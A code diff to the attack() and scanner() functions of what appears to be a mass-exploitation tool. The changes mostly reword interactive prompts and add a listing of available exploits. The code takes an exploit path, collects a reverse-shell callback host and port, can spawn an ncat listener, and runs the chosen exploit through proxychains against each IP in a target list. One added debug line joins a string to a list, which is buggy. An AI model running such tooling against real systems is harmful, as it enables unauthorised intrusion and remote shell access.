@@ -356,20 +356,22 @@ def attack():
             colors.CYAN +
             colors.UNDERLINE +
             colors.BOLD +
-            "\nWelcome, my fellow hacker! \n\n[+] First, let me know what you need\n" +
+            "\nWelcome, in here you can choose your own exploit\n" +
             colors.END)
+        print(colors.CYAN + '[*] Here are available exploits:\n' + colors.END)
+        list_exp()
         exploit = input(
-            "    [*] Enter the path (eg. joomla/rce.py) of your exploit: ").strip()
-        jobs = int(input("    [?] How many processes each time? "))
+            "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ").strip()
+        jobs = int(input("[?] How many processes each time? "))
         custom_args = []
         answ = input("[?] Do you need a reverse shell [y/n]? ").strip()
         if answ == 'y':
             lhost = input(
-                "    [*] Where do you want me to send shells? ").strip()
+                "[*] Where do you want me to send shells? ").strip()
             lport = input(
-                "    [*] and at what port? (make sure you have access to that port) ").strip()
+                "[*] and at what port? (make sure you have access to that port) ").strip()
             custom_args = ['-l', lhost, '-p', lport]
-            answ = input('    [*] Do you need me to start a listener? [y/n] ')
+            answ = input('[*] Do you need me to start a listener? [y/n] ')
             if answ == 'y':
                 print("\n[*] Spawning ncat listener in new window...\n")
                 try:
@@ -390,11 +392,11 @@ def attack():
                         '\n')
             else:
                 print(
-                    "    [*] Okay, just make sure you receive the reverse shells\n")
+                    "[*] Okay, just make sure you receive the reverse shells\n")
         else:
             pass
         custom_args += input(
-            "    [*] args for this exploit (target IP is handled already) ").strip().split()
+            "[*] args for this exploit (target IP is handled already) ").strip().split()
         exec_path = exploit.split('/')[1:]
         work_path = exploit.split('/')[:-1]
         d = '/'
@@ -403,8 +405,7 @@ def attack():
         d = ' '
         print(
             colors.BLUE +
-            '    [*] Your exploit will be executed like\n' +
-            '    ' +
+            '[*] Your exploit will be executed like\n' +
             colors.END,
             'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                 exec_path),
@@ -438,7 +439,7 @@ def scanner(scanner_args):
     e_args += ['-t']
     f = open(init_dir + '/' + ip_list)
     os.chdir('./exploits/' + work_path)
-    console.print_warning(e_args)
+    console.print_warning('\n[!] DEBUG: ' + e_args)
     console.print_warning('\n[!] It might be messy, get ready!' + '\n')
     time.sleep(3)
     count = 0
